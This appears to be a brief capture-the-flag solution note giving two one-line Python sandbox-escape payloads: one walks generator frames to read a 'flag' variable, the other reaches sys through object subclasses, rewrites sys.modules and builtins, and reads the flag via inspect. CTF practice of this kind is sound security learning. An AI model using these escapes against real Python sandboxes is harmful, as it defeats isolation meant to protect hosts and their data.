#generator frame black magic
l = []; l += [(g.gi_frame.f_back.f_back for g in l)]; print(next(l[0]).f_locals['flag'])

#more normal sys.modules modification
glob = [i for i in ().__class__.__base__.__subclasses__() if 'wrap_close' in str(i)][0].__init__.__globals__; sys = glob['sys']; sys.modules = {'builtins': sys}; sys.__dict__.update(glob['__builtins__']); import sys; sys.modules['__main__'] = None; sys.warnoptions = []; import inspect; print(inspect.getouterframes(inspect.currentframe())[-1].frame.f_locals['flag'])

#can also use the gc method from babyjail-2 with the above patch